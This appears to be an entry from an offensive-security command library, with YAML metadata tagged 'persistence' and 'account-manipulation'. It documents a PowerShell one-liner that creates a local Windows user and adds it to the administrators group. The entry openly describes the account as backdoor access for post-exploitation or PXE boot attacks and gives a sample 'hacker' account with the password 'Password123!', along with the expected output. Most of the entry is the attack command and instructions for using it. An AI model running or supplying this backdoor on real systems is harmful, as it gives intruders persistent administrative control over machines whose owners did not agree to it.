---
id: 28a9cbe6-6bfa-410b-abcd-3ef032edb0cd
name: add-windows-local-admin-user
type: command
executor: powershell
data: >-
  net user $_USERNAME $_PASSWORD /add; net localgroup administrators /add
  $_USERNAME
output: null
created_at: '2023-04-06T03:56:08.387910+00:00'
updated_at: '2023-04-10T20:36:00.785400+00:00'
platforms:
  - Windows
tags:
  - persistence
  - account-manipulation
verified: true
validated: true
---

# Add Windows Local Admin User

## Command

```powershell
net user $_USERNAME $_PASSWORD /add; net localgroup administrators /add $_USERNAME
```

## Description

This command creates a new local user account with the specified password and adds it to the administrators group, providing backdoor access. Use it in scripts injected into boot environments or post-exploitation for persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Desired username for the backdoor account | Yes |
| $_PASSWORD | Password for the new account | Yes |

## Examples

### Basic Usage

```powershell
net user hacker Password123! /add; net localgroup administrators /add hacker
```

### Advanced Usage

Run in an elevated context during PXE boot or via remote execution.

## Expected Output

```
The command completed successfully.
The command completed successfully.
```

The account is now created and elevated. Verify with `net user` or `net localgroup administrators`.

## Related

- [[procedures/pxe-boot-image-attack-local-admin-hijack]]
- [[techniques/Account Manipulation|T1098]]
